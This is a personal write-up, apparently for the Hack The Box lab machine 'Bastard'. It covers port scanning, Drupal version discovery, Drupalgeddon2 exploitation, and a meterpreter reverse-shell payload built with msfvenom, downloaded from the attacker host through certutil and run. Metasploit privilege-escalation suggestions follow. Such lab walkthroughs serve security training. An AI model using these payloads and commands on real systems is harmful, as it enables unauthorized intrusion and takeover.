## Nmap Port Scanning
- <mark>Basic Scan</mark>
``` bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -T4 10.10.10.9 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-03 09:31 EDT
Nmap scan report for 10.10.10.9
Host is up (0.022s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.20 seconds

```
- <mark>More Specific Port Scan against 80</mark>
``` bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -sC -T4 10.10.10.9 -p 80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-03 09:36 EDT
Nmap scan report for 10.10.10.9
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Bastard | Bastard
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
```
#### 80/tcp Microsoft IIS httpd 7.5
- According to nmap scanning, port 80 is hosting Drupal CMS and one of the interesting file `CHANGELOG.txt` which allows one to identify the exact Drupal version.![[Pasted image 20230903094326.png]]
	- `searchsploit` reveals potential RCE with the particular Drupal version.
	```bash
	#Drupal property injection in the Forms API
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ searchsploit drupal 7.
	Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                        
	Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)         
	```
- <mark>Exploitation</mark>
```bash
# works out-of-the-box
searchsploit -m 44449
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution | php/webapps/44449.rb
#Shell we get is an ugly where each command is transferred through network to be executed, we want a more interactive shell.
#Generate meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f exe -o reverse.exe
#Upload and execute meterpreter reverse shell using the ugly shell
certutil -urlcache -split -f http://10.10.14.16:8000/reverse.exe reverse.exe
.\reverse.exe
```
- <mark>Post-Exploitation</mark>
```bash
#According to systeminfo, the server is a fresh install of Microsoft Windows Server 2008 R2 Datacenter with no hot patches or whatever.
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 
System Boot Time:          3/9/2023, 4:11:45 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.538 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.557 MB
Virtual Memory: In Use:    538 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
# Loca exploit suggester
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.9 - Collecting local exploits for x64/windows...
[*] 10.10.10.9 - 184 exploit checks are being tried...
[+] 10.10.10.9 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.9 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.9 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.9 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Running check method for exploit 43 / 43
# Escalation  
exploit/windows/local/cve_2019_1458_wizardopium
	OR
exploit/windows/local/cve_2020_1054_drawiconex_lpe
	OR
exploit/windows/local/ms15_051_client_copy_image
........
```